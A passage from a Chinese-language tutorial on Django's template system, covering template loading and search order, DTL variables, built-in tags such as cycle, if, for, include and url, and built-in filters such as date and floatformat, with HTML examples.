'builtins':以圆点分隔的Python路径的列表。

【 模板的简单用法 】
django.template.loader中定义了两个函数以加载模板。

get_template(template_name, using = None)
该函数使用给定的名称查找和加载模板,并返回一个Template对象。
模板的查找和加载机制取决于每种后端引擎和配置,如果想使用指定的模板引擎进行查找,请将模板引擎的NAME赋给get_template的using参数。

select_template(template_name_list, using = None)
和get_template()相似,只不过它使用包含模板名称的列表作为参数。

由select_template()和get_template()返回的Template对象都必须提供一个render()方法:
Template.render(context=None, request=None)
通过给定的context对该模板进行渲染,如果提供了context,那么它必须是一个dict对象。如果要提供request参数,必须使用HttpRequest对象。

</pre>针对下面的TEMPLATES配置,对模版文件的搜索顺序和路径如下<textarea>
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': ['/home/html/example.com','/home/html/default',],
    },
    {
        'BACKEND': 'django.template.backends.jinja2.Jinja2',
        'DIRS': ['/home/html/jinja2',],
    },
]

# 如果调用函数get_template('story_detail.html'),Django将按以下顺序查找story_detail.html:
/home/html/example.com/story_detail.html('django'引擎)
/home/html/default/story_detail.html('django'引擎)
/home/html/jinja2/story_detail.html('jinja2'引擎)

# 如果调用函数select_template(['story_253_detail.html','story_detail.html']),Django按以下顺序查找:
/home/html/example.com/story_253_detail.html('django'引擎)
/home/html/default/story_253_detail.html('django'引擎)
/home/html/jinja2/story_253_detail.html('jinja2'引擎)
/home/html/example.com/story_detail.html('django'引擎)
/home/html/default/story_detail.html('django'引擎)
/home/html/jinja2/story_detail.html('jinja2'引擎)

</textarea><pre>
Django查找到任何一个匹配的模板后便停止搜寻,所以这是个类似url搜索的短路算法操作
建议在每个APP的的模版子目录下都建立一个子目录来唯一对应这个APP,这样做可以增强APP的可用性,将所有的模版文件放在根模版目录下会引发混淆。

在一个子目录内加载模板:
get_template('news/story_detail.html')
如果结合上面例子中的TEMPLATES配置,这将会尝试按顺序查找并加载下列模板︰
/home/html/example.com/news/story_detail.html('django'引擎)
/home/html/default/news/story_detail.html('django'引擎)
/home/html/jinja2/news/story_detail.html('jinja2'引擎)

加载模板、渲染模板的快捷函数
render_to_string(template_name, context=None, request=None, using=None)
render_to_string()会像get_template()一样加载模板并立即调用render()方法
TEMPLATE_NAME:要加载的模板的名称或列表。
context:要用作模板的上下文进行渲染的数据字典,也就是要插入的动态数据字典。
request:可选的HttpRequest对象。
using:指定使用的模板引擎NAME,搜索模板将仅限于该引擎。

from django.template.loader import render_to_string
rendered = render_to_string('my_template.html', {'foo': 'bar'})

【 DTL引擎模板语言的基本语法 】
1. 变量
变量的值来自context中的数据字典,类似于字典对象的keys到values的映射关系。
当模版引擎遇到一个变量,它将从上下文context中获取这个变量的值,然后用值替换掉它本身
变量的命名包括任何字母数字及下划线的组合,点号也有可能会在变量名中出现,不过它有特殊的含义,最重要的是变量名称中不能有空格或标点符号

变量是被}}和{{括起来的部分
My first name is {{ first_name }}. My last name is {{ last_name }}.
假如有一个上下文{'first_name': 'John', 'last_name': 'Doe'},模板渲染后的真实值为:
My first name is John. My last name is Doe.

字典查询,属性查询和列表索引查找都是通过圆点符号.来实现,所以圆点在模版引擎中是万能的上帝
当模版系统遇到点("."),它将以这样的顺序查询这个圆点具体代表的功能:
字典查询(Dictionary lookup),{{ my_dict.key }}
属性或方法查询(Attribute or method lookup){{ my_object.attribute }}
数字索引查询(Numeric index lookup){{ my_list.0 }}
如果使用的变量不存在,模版系统将插入OPTIONS.string_if_invalid选项的值,默认空字符串

模版代码中预定义的变量:一个是user或request.user,一个是perms。
settings.TEMPLATES.OPTIONS.context_processors
'django.template.context_processors.debug',
'django.template.context_processors.request',
'django.contrib.auth.context_processors.auth',
'django.contrib.messages.context_processors.messages',

自定义模板变量
例如自定义模板登录表单的变量
settings.TEMPLATES.OPTIONS.context_processors添加'user.context_processors.login_modal_form'
在user app内新建context_processors.py:
from .forms import LoginForm
def login_modal_form(request): return {'login_modal_form': LoginForm()}
然后可以直接在模板中调用{{ login_modal_form }}来渲染登录表单

2. 标签
模版语言中的标签类似Python中的函数,功能多样,使用灵活,用于在输出中创建文本即输出内容、控制循环或判断逻辑、加载外部信息到模板中供以后的变量使用,甚至可以访问其他的模板标签

部分标签需要使用起始和闭合标签,即 {% 标签 %} ... 标签内容 ... {% ENDTAG %}),典型代表为for循环标签和if判断标签:
{% if user.is_authenticated %}Hello, {{ user.username }}.{% endif %}

大部分标签都接受参数:
{% cycle 'odd' 'even' %} # 循环使用'odd'和'even'

static标签
用于链接保存在STATIC_ROOT中的静态文件
{% load static %}
< img src="{% static 'images/hi.jpg' %}" alt="Hi!" />

还可以使用变量:
{% load static %}
{% static "images/hi.jpg" as myphoto %}
< img src="{{ myphoto }}" />

{% load static %}
< link rel="stylesheet" href="{% static user_stylesheet %}" type="text/css" media="screen" />

【 Django的内置标签 】
autoescape
自动转义开关,控制自动转义是否可用,参数是on或off,该标签会以一个endautoescape作为结束标签

block
块引用,block标签可以被子模板覆盖

comment
注释,在{% comment %}和{% endcomment %}之间的内容作为注释会被忽略,comment标签不能嵌套使用
比如当要注释掉一些代码时可以用此来记录代码被注释掉的原因
< p>Rendered text with {{ pub_date|date:"c" }}< /p>
{% comment "Optional note" %}
    < p>Commented out text with {{ create_date|date:"c" }}< /p>
{% endcomment %}

csrf_token
CSRF令牌标签,这个标签用于跨站请求伪造保护,常用于为form表单post提供csrf令牌
{% csrf_token %}

cycle
循环对象的值,第一次访问返回第一个元素,第二次访问返回第二个参数,以此类推,一旦所有的变量都被访问过了就会回到最开始的地方继续重复下去。这个标签在循环中特别有用,cycle的本质是根据某个规律提供某种特性,比如想循环给表格的行添加底色等
cycle标签中通过空格分割,可以使用任意数量的值,被包含在单引号或双引号中的值被认为是可迭代字符串,相反没有被引号包围的值被当作模版变量。

</pre><textarea>
# 第一次迭代产生的HTML引用了row1类,第二次则是row2类,第三次又是row1 类,如此类推
{% for o in some_list %}
    < tr class="{% cycle 'row1' 'row2'%}">{{ o }}< /tr>
{% endfor %}

# 也可以使用变量,例如如果有两个模版变量:rowvalue1和rowvalue2则可以让他们的值像这样替换:
{% for o in some_list %}
    < tr class="{% cycle rowvalue1 rowvalue2 %}">{{ o }}< /tr>
{% endfor %}

# 被包含在cycle中的变量将会被转义,可以禁止自动转义:
{% for o in some_list %}
    < tr class="{% autoescape off %}{% cycle rowvalue1 rowvalue2 %}{% endautoescape %}">{{ o }}< /tr>
{% endfor %}

# 可以混合使用变量和字符串:
{% for o in some_list %}
    < tr class="{% cycle 'row1' rowvalue2 'row3' %}">{{ o }}< /tr>
{% endfor %}

# 在某些情况下可能需要连续引用一个当前循环的值,而不前进到下一个循环值,要达到这个目的,只需使用as来给{% cycle %}取一个别名
# {% cycle 'row1' 'row2' as rowcolors %}
# 然后可以将别名当作一个模板变量进行引用,从而随意在模板中插入当前循环的值。如果要将循环值移动到原始cycle标记的下一个值,可以使用另一个cycle标记并指定变量的名称

< tr>
    < td class="{% cycle 'row1' 'row2' as rowcolors %}">...< /td>
    < td class="{{ rowcolors }}">...< /td>
< /tr>
< tr>
    < td class="{% cycle rowcolors %}">...< /td>
    < td class="{{ rowcolors }}">...< /td>
< /tr>
# 将输出:
< tr>
    < td class="row1">...< /td>
    < td class="row1">...< /td>
< /tr>
< tr>
    < td class="row2">...< /td>
    < td class="row2">...< /td>
< /tr>

</textarea><pre>
debug
调试模式,输出整个调试信息,包括当前上下文和导入的模块

extends
继承模版,表示当前模板继承自一个父模板,这个标签可以有两种用法:
{% extends "base.html" %}:继承名为"base.html"的父模板
{% extends variable %}:使用variable变量表示的模版

</pre>通常模板名称是相对于模板加载器的根目录,字符串参数也可以是以./或../开头的相对路径<textarea>
dir1/
    template.html
    base2.html
    my/
        base3.html
base1.html

# 在template.html中,以下路径将有效:
{% extends "./base2.html" %}
{% extends "../base1.html" %}
{% extends "./my/base3.html" %}

</textarea><pre>
filter
过滤功能,通过一个或多个过滤器对内容过滤,需要结束标签endfilter
{% filter force_escape|lower %}This text will be HTML-escaped, and will appear in all lowercase.{% endfilter %}

firstof
输出第一个不为False的参数,如果传入的所有变量都为False就什么也不输出,当然也可以用一个默认字符串作为输出以防止传入的所有变量都是False:
{% firstof var1 var2 var3 "fallback value" %}

</pre><textarea>
{% firstof var1 var2 var3 %}
等价于:
{% if var1 %}
    {{ var1 }}
{% elif var2 %}
    {{ var2 }}
{% elif var3 %}
    {{ var3 }}
{% endif %}

</textarea><pre>
for循环标签
循环对象中每个元素,需要结束标签{% endfor %},可以使用{% for obj in list reversed %}进行反向循环
{% for athlete in athlete_list %}< li>{{ athlete.name }}< /li>{% endfor %}
{% for x, y in points %}There is a point at {{ x }},{{ y }}{% endfor %} # 访问二元元组
{% for key, value in data.items %}{{ key }}: {{ value }}{% endfor %} # 访问一个字典中的键值

Django为for标签内置的一些属性,可以当作变量一样使用{{ }}在模版中使用。
forloop.counter:循环的当前索引值,从1开始计数;常用于生成一个表格或列表的序号
forloop.counter0:循环的当前索引值,从0开始计数;
forloop.revcounter:循环结束的次数(从1开始)
forloop.revcounter0 循环结束的次数(从0开始)
forloop.first:判断当前是否循环的第一次,是的话该变量的值为True,经常要为第一行加点特殊的对待,就用得上这个判断了,结合if。
forloop.last:如果这是最后一次循环则为真
forloop.parentloop:对于嵌套循环,返回父循环所在的循环次数。某些场景下,这是个大杀器,能解决很多头疼的问题。

for … empty
带empty说明的循环,for标签带有一个可选的{% empty %}从句,以便在循环对象是空的或没有被找到时可以有所操作和提示

</pre><textarea>
{% for athlete in athlete_list %}
    < li>{{ athlete.name }}< /li>
{% empty %}
    < li>Sorry, no athletes in this list.< /li>
{% endfor %}

# 它和下面的例子作用相等,但是更简洁、更清晰甚至可能运行起来更快:
  {% if athlete_list %}
    {% for athlete in athlete_list %}
      < li>{{ athlete.name }}< /li>
    {% endfor %}
  {% else %}
    < li>Sorry, no athletes in this list.< /li>
  {% endif %}

</textarea><pre>
if,elif和else标签
条件判断,计算一个表达式且当表达式的值是"True"时显示块中的内容,需要{% endif %}结束标签

</pre><textarea>
{% if athlete_list %}
    Number of athletes: {{ athlete_list|length }}
{% elif athlete_in_locker_room_list %}
    Athletes should be out of the locker room soon!
{% else %}
    No athletes.
{% endif %}

</textarea>if标签可以使用not,and或or来测试布尔值<textarea>
{% if athlete_list and coach_list %}
    Both athletes and coaches are available.
{% endif %}

{% if not athlete_list %}
    There are no athletes.
{% endif %}

{% if athlete_list or coach_list %}
    There are some athletes or some coaches.
{% endif %}

{% if not athlete_list or coach_list %}
    There are no athletes or there are some coaches.
{% endif %}

{% if athlete_list and not coach_list %}
    There are some athletes and absolutely no coaches.
{% endif %}

# 允许同时使用and和or子句,and优先于or,在if标签中使用实际括号是错误的语法,这点不同于Python。如果需要为它们指示优先级,应使用嵌套的if标签
{% if athlete_list and coach_list or cheerleader_list %}
将解释如下:
if (athlete_list and coach_list) or cheerleader_list

</textarea>还可以在if标签中使用过滤器和多种运算符,大多数模版过滤器都返回字符串类型,所以使用过滤器做整数类型的比较通常是错误的,但length是一个例外<textarea>
{% if athlete_list|length > 1 %}
   Team: {% for athlete in athlete_list %} ... {% endfor %}
{% else %}
   Athlete: {{ athlete_list.0.name }}
{% endif %}

{% if messages|length >= 100 %}You have lots of messages today!{% endif %}

</textarea>if标签允许使用这些操作符:==, !=, <, >, <=, >=, in, not in, is, is not<textarea>
{% if somevar == "x" %}This appears if variable somevar equals the string "x"{% endif %}
{% if somevar != "x" %}This appears if variable somevar does not equal the string "x", or if somevar is not found in the ontext{% endif %}
{% if somevar < 100 %}This appears if variable somevar is less than 100.{% endif %}
{% if somevar > 0 %}This appears if variable somevar is greater than 0.{% endif %}
{% if somevar <= 100 %}This appears if variable somevar is less than 100 or equal to 100.{% endif %}
{% if somevar >= 1 %}This appears if variable somevar is greater than 1 or equal to 1.{% endif %}

{% if "bc" in "abcdef" %}This appears since "bc" is a substring of "abcdef"{% endif %}
{% if "hello" in greetings %}If greetings is a list or set, one element of which is the string "hello", this will appear.{% endif %}
{% if user not in users %}If users is a QuerySet, this will appear if user is not an instance that belongs to the QuerySet.{% endif %}

{% if somevar is True %}This appears if and only if somevar is True.{% endif %}
{% if somevar is None %}This appears if somevar is None, or if somevar is not found in the context.{% endif %}
{% if somevar is not True %}This appears if somevar is not True, or if somevar is not found in the context.{% endif %}
{% if somevar is not None %}This appears if and only if somevar is not None.{% endif %}

# 比较运算符不能像Python或数学符号中那样"链接"
{% if a > b > c %}  (错误的用法)
应该使用:
{% if a > b and b > c %}

</textarea><pre>
ifchanged
检查一个值是否在上一次的迭代中被改变了,{% ifchanged %}标签通常用在循环里,有两个用处:
检查已经渲染过的内容的当前状态,并且只会显示发生改变的内容。例如以下的代码是输出days的列表项,不过它只会输出被修改过月份的项:

</pre><textarea>
< h1>Archive for {{ year }}< /h1>
{% for date in days %}
    {% ifchanged %}< h3>{{ date|date:"F" }}< /h3>{% endifchanged %}
    < a href="{{ date|date:"M/d"|lower }}/">{{ date|date:"j" }}< /a>
{% endfor %}

# 如果标签内有多个值时则会比较每一个值是否与上一次不同。例如以下显示每次更改时的日期,如果小时或日期已更改则显示小时:
{% for date in days %}
    {% ifchanged date.date %} {{ date.date }} {% endifchanged %}
    {% ifchanged date.hour date.date %}
        {{ date.hour }}
    {% endifchanged %}
{% endfor %}

# ifchanged标记也可以采用可选的{% else %}将显示值没有改变的情况:
{% for match in matches %}
    < div style="background-color:
        {% ifchanged match.ballot_id %}
            {% cycle "red" "blue" %}
        {% else %}
            gray
        {% endifchanged %}
    ">{{ match }}< /div>
{% endfor %}

</textarea><pre>
include
导入子模版的内容,加载指定的模板并以标签内的参数渲染。这是一种引入别的模板的方法,一定要将include和extend区分开,include类似Python的import。
{% include "foo/bar.html" %}
{% include template_name %}  # 也可以使用变量名template_name

下面这个示例生成输出"Hello, John!":
context:变量greeting="Hello",变量person="John"。
模板:{% include "name_snippet.html" %}
name_snippet.html模板:{{ greeting }}, {{ person|default:"friend" }}!

可以使用关键字参数将额外的上下文传递到模板:
{% include "name_snippet.html" with person="Jane" greeting="Hello" %}

如果仅使用提供的变量来渲染上下文则添加only选项。
{% include "name_snippet.html" with greeting="Hi" only %}

include标签应该被理解为是一种"将子模版渲染并嵌入当前HTML中"的变种方法,而不应该看作是"解析子模版并在被父模版包含的情况下展现其被父模版定义的内容",这意味着在不同的被包含的子模版之间并不共享父模版的状态,每一个子包含都是完全独立的渲染过程。

load
加载标签和过滤器,加载自定义模板标签。
下面的模板将会从somelibrary和package包中的otherlibrary中载入所有已经注册的标签和过滤器:
{% load somelibrary package.otherlibrary %}
还可以使用from参数从库中选择性加载单个过滤器或标记。
{% load foo bar from somelibrary %}

lorem
用来在模版中提供文字样本以供测试用的。使用场景:比如要写个demo,里面要有一大段的文字和篇章,不可能真的去写一篇文章吧？如果懒得去网上COPY,又不愿意使用一堆毫无意义杂乱的乱码,那么使用这个方法可以自动填充一些可以阅读的内容。

用法:
{% lorem [count] [method] [random] %}
可以使用零个,一个,两个或三个参数,这些参数是:
count :一个数字或变量,其中包含要生成的段落或字数,默认值为1
method:HTML中使用p标签、还是w标签、还是b标签,决定文本格式。默认是"b"。
random:如果给出的话,random这个词在生成文本时不会使用公共段落
{% lorem %}将输出常见的"lorem ipsum"段落。
{% lorem 3 p %}输出常用的"lorem ipsum"段落和两个随机段落,每段包裹在HTML的p标签中。
{% lorem 2 w random %}将输出两个随机拉丁字。

now
显示当前的日期或时间,可以指定显示的格式
It is {% now "jS F Y H:i" %}
It is the {% now "jS \o\f F" %} # "o"和"f"都被反斜杠转义,这将显示为"It is the 4th of September"。
还可以使用语法{% now "Y" as current_year %}将输出存储在变量中。
{% now "Y" as current_year %}
{% blocktrans %}Copyright {{ current_year }}{% endblocktrans %}

regroup
根据对象重组集合,用对象间共有的属性重组列表

</pre><textarea>
# 对于下面的数据:
cities = [
    {'name': 'Mumbai', 'population': '19,000,000', 'country': 'India'},
    {'name': 'Calcutta', 'population': '15,000,000', 'country': 'India'},
    {'name': 'New York', 'population': '20,000,000', 'country': 'USA'},
    {'name': 'Chicago', 'population': '7,000,000', 'country': 'USA'},
    {'name': 'Tokyo', 'population': '33,000,000', 'country': 'Japan'},
]

# 如果想显示按国家/地区排序的分层列表,如下所示:
India
    Mumbai: 19,000,000
    Calcutta: 15,000,000
USA
    New York: 20,000,000
    Chicago: 7,000,000
Japan
    Tokyo: 33,000,000

# 可以使用{% regroup %}标签来给每个国家的城市分组:
{% regroup cities by country as country_list %}

< ul>
{% for country in country_list %}
    < li>{{ country.grouper }}
    < ul>
        {% for city in country.list %}
          < li>{{ city.name }}: {{ city.population }}< /li>
        {% endfor %}
    < /ul>
    < /li>
{% endfor %}
< /ul>

</textarea><pre>
resetcycle
重置先前的循环,以便在下一次循环时从其第一个项目重新启动。如果没有参数,{% resetcycle %}将重置最后一个{% cycle %}。

</pre><textarea>
{% for coach in coach_list %}
    < h1>{{ coach.name }}< /h1>
    {% for athlete in coach.athlete_set.all %}
        < p class="{% cycle 'odd' 'even' %}">{{ athlete.name }}< /p>
    {% endfor %}
    {% resetcycle %}
{% endfor %}

# 这个示例将返回下面的HTML:
< h1>José Mourinho< /h1>
< p class="odd">Thibaut Courtois< /p>
< p class="even">John Terry< /p>
< p class="odd">Eden Hazard< /p>

< h1>Carlo Ancelotti< /h1>
< p class="odd">Manuel Neuer< /p>    # 以odd开头
< p class="even">Thomas Müller< /p>

# 还可以重置循环标签:在这个例子中有交替的奇数/偶数行和每五行出现一次的'major'行。当类别更改时,只有五行周期被重置
{% for item in list %}
    < p class="{% cycle 'odd' 'even' as stripe %} {% cycle 'major' 'minor' 'minor' 'minor' 'minor' as tick %}">
        {{ item.data }}
    < /p>
    {% ifchanged item.category %}
        < h1>{{ item.category }}< /h1>
        {% if not forloop.first %}{% resetcycle tick %}{% endif %}
    {% endifchanged %}
{% endfor %}

</textarea><pre>
spaceless
删除HTML标签之间的空白,包括制表符和换行,仅会删除tags之间的空格,不会删除标签和文本之间的

</pre><textarea>
{% spaceless %}
    < p>
        < a href="foo/">Foo< /a>
    < /p>
{% endspaceless %}

# 这个示例将返回下面的HTML:
< p>< a href="foo/">Foo< /a>< /p>

</textarea><pre>
templatetag
输出用于构成模板标签的语法字符,由于模板系统没有"转义"的概念,无法在HTML中使用'\'转义出类似{%的字符。为了显示模板标签本身,必须使用{% templatetag %}标签,并添加相应的参数:

openblock:{%
closeblock: %}
openvariable: {{
closevariable: }}
openbrace :{
closebrace: }
opencomment: {＃
closecomment: ＃}

{% templatetag openblock %} url 'entry_list' {% templatetag closeblock %}

url
获取url字符串,返回与给定视图和可选参数匹配的绝对路径引用,不带域名的URL。在解析后返回的结果路径字符串中每个特殊字符将使用iri_to_uri()编码,这可以避免在模板中硬编码超级链接路径。
{% url 'some-url-name' v1 v2 %}
第一个参数是url()的名字,它可以是一个被引号引起来的字符串或其他的上下文变量,其他参数是可选的并且以空格隔开,这些值会在URL中以参数的形式传递。上面的例子展示了如何传递位置参数,当然也可以使用关键字参数。
{% url 'some-url-name' arg1=v1 arg2=v2 %}
不要把位置参数和关键字参数混在一起使用,URLconf所需的所有参数都应该提供。

假设有一个视图app_views.client,其URLconf接受客户端ID,并如下所示:
('^client/([0-9]+)/$', app_views.client, name='app-views-client')
如果应用中的URLconf已经被包含到项目URLconf中,比如下面这样
('^clients/', include('project_name.app_name.urls'))
然后在模板中可以创建一个此视图的链接,如下所示:
{% url 'app-views-client' client.id %}
模板标签会输出字符串:/clients/client/123/

如果希望在不显示网址的情况下检索网址,可以使用略有不同的调用:
{% url 'some-url-name' arg arg2 as the_url %}
< a href="{{ the_url }}">I'm linking to {{ the_url }}< /a>
如果视图不存在,{% url ... as var %}语法不会导致错误。
{% url 'some-url-name' as the_url %}
{% if the_url %}< a href="{{ the_url }}">Link to optional stuff< /a>{% endif %}

如果使用urlconf的名称空间网址,通过冒号指定完全名称:
{% url 'myapp:view-name' %}

verbatim
禁止模版引擎在该标签中进行渲染工作,常见的用法是允许与Django语法冲突的JavaScript模板图层工作
{% verbatim %}{{if dying}}Still alive.{{/if}}{% endverbatim %}

widthratio
宽度比例,为了创建柱状形图,此标签计算给定值与最大值的比率,然后将该比率应用于常量
< img src="bar.png" alt="Bar" height="10" width="{% widthratio this_value max_value max_width %}" />
如果this_value=175,max_value=200,max_width=100,则示例中的图像将是88像素宽(因为175/200=.875; .875*100 =87.5,四舍五入入为88)。

with
上下文变量管理器,使用一个简单地名字缓存一个复杂的变量,当需要使用一个代价较大的方法比如访问数据库很多次的时候这是非常有用的。
{% with total=business.employees.count %} # total只在with标签内部有效
    {{ total }} employee{{ total|pluralize }}
{% endwith %}
可以分配多个变量:
{% with alpha=1 beta=2 %}...{% endwith %}

3. 过滤器
过滤器用于修改变量或标签参数的值,使用管道符号(|)来应用过滤器,可以创建自定义的模板过滤器和标签
{{ django|title }}  # 将模板变量中的字符串所有的单词首字母大写
{{ name|lower }} # 该过滤器将文本转换成小写
{{ value|default:"nothing" }} # default为false或者空变量提供默认值
{{ value|default_if_none:"nothing" }} # default_if_none当value为None时使用给定的默认值。

# length,返回值的长度,它对字符串和列表都起作用。
{{ value|length }} # 如果value是['a', 'b', 'c', 'd'],那么输出4。

# filesizeformat,格式化为"人类可读"文件大小单位,即'13 KB'、'4.1 MB'、'102 bytes'等
{{ value|filesizeformat }} # 如果value是123456789,输出将会是117.7MB。

有些过滤器还接收一个参数,为模版过滤器提供参数的方式是过滤器后加个冒号,再紧跟参数,中间不能有空格,目前只能为过滤器最多提供一个参数
{{ my_date|date:"Y-m-d" }} # 按指定的格式"Y-m-d"]显示日期
{{ bio|truncatewords:30 }} # 显示bio变量的前30个词

过滤器参数包含空格的话必须用引号包起来
{{ list|join:", " }} # 使用逗号和空格去连接一个列表中的元素

过滤器链:过滤器可以"链接",一个过滤器的输出应用于下一个过滤器
{{ text|escape|linebreaks }} # 先转义文本内容,然后把文本行转成p标签。

内置过滤器
add
加法,把add后的参数加给value
{{ value|add:"2" }} # 如果value为4则会输出6
过滤器首先会强制把两个值转换成Int类型。 如果强制转换失败则会试图使用各种方式把两个值相加。
{{ first|add:second }} # 如果first是[1, 2, 3],second是[4, 5, 6], 将会输出[1, 2, 3, 4, 5, 6].

addslashes
在引号前面加上斜杆,常用于在CSV中转义字符串
{{ value|addslashes }} # 如果value是"I'm using Django", 输出将变成 "I\'m using Django"

capfirst
首字母大写,如果第一个字符不是字母该过滤器将不会生效。
{{ value|capfirst }}  # 如果value是"django"输出将变成"Django"

center
文本居中,在给定的宽度范围内居中.
"{{ value|center:"15" }}" # 如果value是"Django",输出将是Django。

cut
移除value中所有的与给定参数相同的字符串。
{{ value|cut:" " }} # 如果value为"String with spaces",输出将为"Stringwithspaces"。

default
为false或者空变量提供默认值
{{ value|default:"nothing" }}

default_if_none
当value为None时使用给定的默认值。
{{ value|default_if_none:"nothing" }}

date
根据给定格式对一个日期变量进行格式化,可用的格式字符串:
Y   年,4位数。 '1999'
y   年份,2位数字。 '99'

F   月,文字形式。 'January'
b   月份,文字形式的3个小写字母    "jan"
M   月,文字,3个字母。  "Jan"
N   美联社风格的月份缩写。 'Jan.','Feb.','March','May'
n   月无前导零。  '1'到'12'
m   月,2位数字带前导零。 '01'到'12'

d   月的日子,带前导零的2位数字。 '01'到'31'
j   没有前导零的月份的日子。    '1'到'31'

l   星期几,完整英文名   'Friday'
D   周几的文字表述形式,3个字母。 'Fri'
w   星期几,数字无前导零。 '0'(星期日)至'6'(星期六)

a   'a.m.'或'p.m.'   'a.m.'
A   'AM'或'PM'   'AM'

f   时间  '1','1:30'
P   时间为12小时 '1 am','1:30 pm','midnight','noon','12:30 pm'>

g   12小时格式,无前导零。 '1'到'12'
G   24小时格式,无前导零。 '0'到'23'
h   12小时格式。 '01'到'12'
H   24小时格式。 '00'到'23'

i   分钟 '00'到'59'
s   秒,带前导零的2位数字。    '00'到'59'
u   微秒。 000000 to 999999

U   自Unix Epoch以来的秒数(1970年1月1日00:00:00 UTC)。

e   时区名称    '','GMT','-500','US/Eastern'等
O   与格林威治时间的差,单位小时。 '+0200'
Z   时区偏移量,单位为秒。 -43200到43200
T   本机的时区。  'EST','MDT'

c   ISO 8601格式  2008-01-02T10:30:00.000123+02:00
r   RFC 5322格式化日期。  'Thu, 21 Dec 2000 16:01:07 +0200'
E   月份,分地区。
I   夏令时间,无论是否生效。 '1'或'0'
L   布尔值是否是一个闰年。 True或False
o   ISO-8601周编号 '1999'
S   一个月的英文序数后缀,2个字符。    'st','nd','rd'或'th'
t   给定月份的天数。    28 to 31
W   ISO-8601周数,周数从星期一开始。    1,53
z   一年中的日子  0到365

{{ blog.created_time|date:"Y-m-d H:n:s" }}

{{ value|date:"D d M Y" }} # 如果value是一个datetime对象如datetime.datetime.now(),输出将是字符串'Wed 09 Jan 2008'。

可以将date与time过滤器结合使用,以呈现datetime值的完整表示形式
{{ value|date:"D d M Y" }} {{ value|time:"H:i" }}

dictsort
字典排序,接受一个包含字典元素的列表,并返回按参数中给出的键排序后的列表。
{{ value|dictsort:"name" }}
如果value为:
[{'name': 'zed', 'age': 19},{'name': 'amy', 'age': 22},{'name': 'joe', 'age': 31}]
那么输出将是:
[{'name': 'amy', 'age': 22},{'name': 'joe', 'age': 31},{'name': 'zed', 'age': 19}]

{% for book in books|dictsort:"author.age" %}
    * {{ book.title }} ({{ book.author.name }})
{% endfor %}
如果books是:
[
    {'title': '1984', 'author': {'name': 'George', 'age': 45}},
    {'title': 'Timequake', 'author': {'name': 'Kurt', 'age': 75}},
    {'title': 'Alice', 'author': {'name': 'Lewis', 'age': 33}},
]
那么输出:
* Alice (Lewis)
* 1984 (George)
* Timequake (Kurt)

dictsort也可以按指定索引对多维列表进行排序:
{{ value|dictsort:0 }}
如果value为:
[('a', '42'),('c', 'string'),('b', 'foo')]
那么输出将是:
[('a', '42'),('b', 'foo'),('c', 'string')]

必须提供整数索引,不能是字符串,以下产生空输出:
{{ values|dictsort:"0" }}

dictsortreversed
字典反向排序

divisibleby
如果value可以被参数整除则返回True。
{{ value|divisibleby:"3" }} # 如果value是21则输出True。

escape
转义字符串的HTML。
转义仅在字符串输出时应用,因此在链接的过滤器序列中escape的位置无关紧要,就像它是最后一个过滤器,如果要立即应用转义请使用force_escape过滤器

escapejs
转义用于JavaScript字符串的字符。确保在使用模板生成JavaScript/JSON时避免语法错误。
{{ value|escapejs }}
如果value为testing\r\njavascript \'string" < b>escaping< /b>,输出将为testing\\u000D\\u000Ajavascript \\u0027string\\u0022 \\u003Cb\\u003Eescaping\\u003C/b\\u003E

filesizeformat
格式化为直观的文件大小形式(即'13 KB', '4.1 MB', '102 bytes'等)。
{{ value|filesizeformat }}  # 如果value为123456789,输出将是117.7 MB

first
返回列表中的第一项。
{{ value|first }} # 如果value是列表['a', 'b', 'c'] ,输出将为'a'

floatformat
浮点数格式化,当不使用参数时将浮点数四舍五入到小数点后一位,但前提是要显示小数部分
value           模板语法                输出
34.23234    {{ value | floatformat }}   34.2
34.00000    {{ value | floatformat }}   34
34.26000    {{ value | floatformat }}   34.3

如果与数字整数参数一起使用,将数字四舍五入为小数位数
value           模板语法                输出
34.23234    {{ value | floatformat:3 }} 34.232
34.00000    {{ value | floatformat:3 }} 34.000
34.26000    {{ value | floatformat:3 }} 34.260

特别有用的是传递0(零)作为参数,它将使float浮动到最接近的整数。
value           模板语法                    输出
34.23234    {{ value | floatformat:"0" }}   34
34.00000    {{ value | floatformat:"0" }}   34
39.56000    {{ value | floatformat:"0" }}   40

如果传递给floatformat的参数为负则会将一个数字四舍五入到小数点后的位置,但前提是要显示一个小数部分
value           模板语法                输出
34.23234    {{ value | floatformat:" - 3" }}    34.232
34.00000    {{ value | floatformat:" - 3" }}    34
34.26000    {{ value | floatformat:" - 3" }}    34.260

force_escape
强制立即转义HTML字符串

get_digit
给定一个整数,返回所请求的数字,1表示最右边的数字,2表示第二个最右边的数字,以此类推。
{{ value|get_digit:"2" }} # 如果value为123456789,则输出8

iriencode
将IRI(国际化资源标识符)转换为适合包含在URL中的字符串。
{{ value|iriencode }} # 如果value是?test=1&me=2,输出则是?test=1& amp;me=2

join
字符列表链接,使用字符串连接列表,类似Python的str.join(list)
{{ value|join:" // " }} # 如果value是列表['a', 'b', 'c'] ,输出为a // b // c。

last
返回列表中的最后一个项目,类似first过滤器。
{{ value|last }}

length
返回对象的长度,适用于字符串和列表,对于未定义的变量过滤器返回0。
{{ value|length }} # 如果value是['a', 'b', 'c', 'd']或"abcd",输出将为4。

length_is
如果对象的长度等于参数值则返回True,否则返回False。
{{ value|length_is:"4" }} # 如果value是['a', 'b', 'c', 'd']或"abcd",输出将为True

linebreaks
替换纯文本中的换行符为p标签。
{{ value|linebreaks }}  # 如果value是Joel\nis a slug,输出将为< p>Joel< br />is a slug< /p>。

linebreaksbr
替换纯文本中的换行符为br标签。
{{ value|linebreaksbr }} # 如果value是Joel\nis a slug,输出将为Joel< br />is a slug。

linenumbers
显示带行号的文本。
{{ value|linenumbers }}
如果value为:
one
two
three
输出将是:
1. one
2. two
3. three

ljust
给定宽度下左对齐。
"{{ value|ljust:"10" }}"  # 如果value为Django,则输出为Django

lower
将字符串转换为全部小写。
{{ value|lower }}

make_list
将对象转换为字符的列表。对于字符串,直接拆分为单个字符的列表。对于整数,在创建列表之前将参数强制转换为unicode字符串。
{{ value|make_list }}
如果value是字符串"Joel",输出将是列表['J', 'o' , 'e', 'l']。
如果value为123,输出为列表['1', '2', '3']。

phone2numeric
将电话号码(可能包含字母)转换为其等效数字。
{{ value|phone2numeric }} # 如果value为800-COLLECT,输出将为800-2655328

pluralize
如果值不是1则返回一个复数形式,通常在后面添加's'表示。
